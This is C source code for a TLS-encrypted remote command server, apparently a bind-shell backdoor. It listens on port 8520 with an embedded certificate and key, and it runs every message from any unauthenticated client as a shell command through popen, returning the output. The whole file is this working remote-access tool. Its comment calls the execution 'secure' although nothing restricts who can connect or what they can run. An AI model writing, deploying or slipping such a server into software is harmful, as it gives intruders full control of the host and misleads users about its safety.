#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/types.h>
#include <sys/socket.h>

// Declaration of arrays containing certificate and private key in hexadecimal
extern const unsigned char server_crt[];
extern unsigned int server_crt_len;

extern const unsigned char server_key[];
extern unsigned int server_key_len;

void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

SSL_CTX *create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = TLS_server_method(); // TLS method for server
    ctx = SSL_CTX_new(method);

    if (!ctx) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    return ctx;
}

void configure_context(SSL_CTX *ctx) {
    // Load the certificate from hexadecimal data
    if (SSL_CTX_use_certificate_ASN1(ctx, server_crt_len, server_crt) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    // Load the private key from hexadecimal data
    if (SSL_CTX_use_PrivateKey_ASN1(EVP_PKEY_RSA, ctx, server_key, server_key_len) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    // Verify if the private key matches the certificate
    if (!SSL_CTX_check_private_key(ctx)) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}

void handle_client(SSL *ssl) {
    char buffer[1024];
    int bytes;

    while (1) {
        memset(buffer, 0, sizeof(buffer));

        // Read data from client
        bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
        if (bytes <= 0) {
            break;
        }

        buffer[bytes] = '\0';

        // Check if the message is "exit"
        if (strcasecmp(buffer, "exit") == 0) {
            break;
        }

        // Check if the message is "stop" (stop the server)
        if (strcasecmp(buffer, "stop") == 0) {
            SSL_write(ssl, "Server shutdown requested.\n", 26);
            exit(0);  // Consider using a flag to stop the server gracefully
        }

        // Execute the shell command securely (sanitization recommended)
        FILE *fp = popen(buffer, "r");
        if (fp == NULL) {
            continue;
        }

        char result[1024] = "";
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            strncat(result, buffer, sizeof(result) - strlen(result) - 1);
        }
        pclose(fp);

        // Send the result back to the client
        SSL_write(ssl, result, strlen(result));
    }
}

int main() {
    int server_sock;
    struct sockaddr_in addr;

    initialize_openssl();  // Initialize OpenSSL
    SSL_CTX *ctx = create_context();  // Create SSL context
    configure_context(ctx);  // Configure SSL context with certificate and private key

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("Socket error");
        exit(EXIT_FAILURE);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(8520);  // Port where the server listens
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("Bind error");
        exit(EXIT_FAILURE);
    }

    if (listen(server_sock, 5) < 0) {
        perror("Listen error");
        exit(EXIT_FAILURE);
    }

    while (1) {
        struct sockaddr_in client_addr;
        unsigned int len = sizeof(client_addr);
        int client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &len);

        if (client_sock < 0) {
            perror("Accept error");
            continue;
        }

        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, client_sock);

        if (SSL_accept(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
        } else {
            handle_client(ssl);  // Handle the client connection
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client_sock);
    }

    close(server_sock);
    SSL_CTX_free(ctx);
    cleanup_openssl();

    return 0;
}
